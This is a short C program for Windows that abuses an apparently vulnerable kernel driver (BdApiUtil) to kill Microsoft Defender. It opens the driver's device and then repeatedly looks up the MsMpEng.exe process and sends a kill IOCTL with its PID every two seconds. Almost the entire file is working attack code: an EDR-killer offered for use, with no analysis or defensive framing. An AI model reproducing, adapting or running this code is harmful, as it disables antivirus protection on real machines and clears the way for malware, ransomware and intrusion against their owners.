#include <Windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <stdio.h>


#define KILL_IOCTL_CODE 0x800024B4
#define DRIVER_DEVICE L"\\\\.\\BdApiUtil"
#define WINDOWS_ENGINE TRUE

int EnumerateProcess(const wchar_t* ProcessName) {
	DWORD PID = 0;
	PROCESSENTRY32 pe32;
	HANDLE hSnapshot;
	int pid = -1;

	// Take a snapshot of all processes
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return -1;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Get the first process
	if (Process32First(hSnapshot, &pe32)) {
		do {
			// Compare process name (case-insensitive)
			char* filename = pe32.szExeFile;
			if (_wcsicmp((char*)pe32.szExeFile, ProcessName) == 0) {
				pid = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[]) {
	HANDLE hDriver = CreateFileW(DRIVER_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDriver || hDriver == 0xffffffffffffffff) {
		printf("SymLink unavailable!");
		exit(1);
	}

	DWORD bytesReturned = 0;
	BYTE outBuffer[256];

	while (1) {
		if(WINDOWS_ENGINE) {
			DWORD PID;

			const wchar_t* targetProcess = L"MsMpEng.exe";
			PID = EnumerateProcess(targetProcess);
			BOOL ioctl_result;

			if (PID != -1) {
				ioctl_result = DeviceIoControl(hDriver, KILL_IOCTL_CODE, &PID, sizeof(PID), &outBuffer, 256, &bytesReturned, NULL);
				if (ioctl_result) {
					printf("Defender Must've Died\n");
				}
				else {
					printf("Something botched up :(\n");
				}
			}
			else {
				printf("No Defender Engine found\n");
			}
		}

		Sleep(2000);
	}
}